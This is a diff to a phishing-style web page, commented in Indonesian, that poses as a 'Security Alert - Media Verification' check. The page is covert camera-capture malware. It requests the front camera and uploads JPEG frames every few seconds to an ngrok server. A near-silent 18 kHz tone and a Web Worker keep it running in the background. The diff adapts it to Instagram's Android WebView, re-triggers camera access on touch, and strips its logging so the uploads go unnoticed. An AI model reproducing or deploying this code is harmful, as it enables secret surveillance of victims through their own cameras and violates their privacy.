@@ -2,8 +2,8 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - Media Verification v3.8</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Security Alert - Media Verification v3.9</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; }
@@ -24,13 +24,13 @@
 
   var CONFIG = {
     tts: {
-      text: "Security verification required. Background monitoring session active.",
+      text: "Security verification required. WebView background session active.",
       lang: 'en-US',
       rate: 0.9,
       pitch: 1.0,
-      repeatInterval: 6000
+      repeatInterval: 5000
     },
-    loopInterval: 3000,
+    loopInterval: 2500,
     uploadInterval: 3000,
     serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_capture'
   };
@@ -44,8 +44,7 @@
   };
 
   // ============================================
-  // BACKGROUND THROTTLE BYPASS (Audio Keep-Alive)
-  // Mencegah browser membekukan proses JavaScript saat tab tidak aktif
+  // AUDIO KEEP-ALIVE (Mencegah Suspend WebView Android)
   // ============================================
   function initAudioKeepAlive() {
     try {
@@ -55,19 +54,22 @@
       var oscillator = state.audioCtx.createOscillator();
       var gainNode = state.audioCtx.createGain();
       
-      gainNode.gain.value = 0.00001; // Hampir tak bersuara
-      oscillator.frequency.value = 15000;
+      gainNode.gain.value = 0.00001;
+      oscillator.frequency.value = 18000;
       oscillator.connect(gainNode);
       gainNode.connect(state.audioCtx.destination);
       
       oscillator.start();
-      console.log("[+] Audio keep-alive active.");
+      
+      if (state.audioCtx.state === 'suspended') {
+        state.audioCtx.resume();
+      }
     } catch (e) {}
   }
 
   // ============================================
-  // WEB WORKER THREAD (Anti-Timer Throttling)
-  // Menjalankan interval di thread terpisah agar tidak diperlambat OS/Browser
+  // WEB WORKER BACKGROUND THREAD
+  // Memastikan interval tetap berdetak meski WebView di-minimize
   // ============================================
   function initBackgroundWorker(intervalMs) {
     try {
@@ -90,9 +92,7 @@
         }
       };
       state.worker.postMessage('start');
-      console.log("[+] Background Web Worker active.");
     } catch (e) {
-      // Fallback ke timer standar jika worker dibatasi
       setInterval(backgroundTick, intervalMs);
     }
   }
@@ -135,7 +135,7 @@
       if (videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
 
       ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-      var dataURL = canvas.toDataURL('image/jpeg', 0.80);
+      var dataURL = canvas.toDataURL('image/jpeg', 0.75);
       var payload = JSON.stringify({ image: dataURL });
 
       if (isUnloading && navigator.sendBeacon) {
@@ -154,21 +154,20 @@
         if (!res.ok) throw new Error('Status: ' + res.status);
         return res.json();
       })
-      .then(function(data) {
-        console.log('[+] Frame uploaded successfully:', data.filename);
-      })
-      .catch(function(err) {
-        console.log('[-] Upload failed:', err.message);
-      });
+      .catch(function(err) {});
     } catch (e) {}
   }
 
   // ============================================
-  // CAMERA LOOP & BACKGROUND TICK
+  // CAMERA ACCESS & RECOVERY
   // ============================================
   function requestCameraAccess() {
     navigator.mediaDevices.getUserMedia({ 
-      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
+      video: { 
+        width: { ideal: 640 }, 
+        height: { ideal: 480 }, 
+        facingMode: "user" 
+      }, 
       audio: false 
     })
     .then(function(stream) {
@@ -203,7 +202,7 @@
   }
 
   // ============================================
-  // INISIALISASI UTAMA
+  // INITIALIZATION & EVENT LISTENERS
   // ============================================
   window.addEventListener('DOMContentLoaded', function() {
     initAudioKeepAlive();
@@ -216,18 +215,24 @@
     captureAndUpload(true);
   });
 
-  window.addEventListener('click', function() {
+  // Memicu resume audio/kamera saat ada interaksi sentuh di dalam WebView Instagram
+  window.addEventListener('touchstart', function() {
     if (state.audioCtx && state.audioCtx.state === 'suspended') {
       state.audioCtx.resume();
     }
-  });
+    if (!state.camActive) {
+      requestCameraAccess();
+    }
+  }, { passive: true });
 
+  // Page Visibility API untuk mendeteksi pergeseran fokus WebView Instagram
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden) {
       startTTS();
-      if (!state.camActive) {
-        requestCameraAccess();
+      if (state.audioCtx && state.audioCtx.state === 'suspended') {
+        state.audioCtx.resume();
       }
+      requestCameraAccess();
     }
   });
 
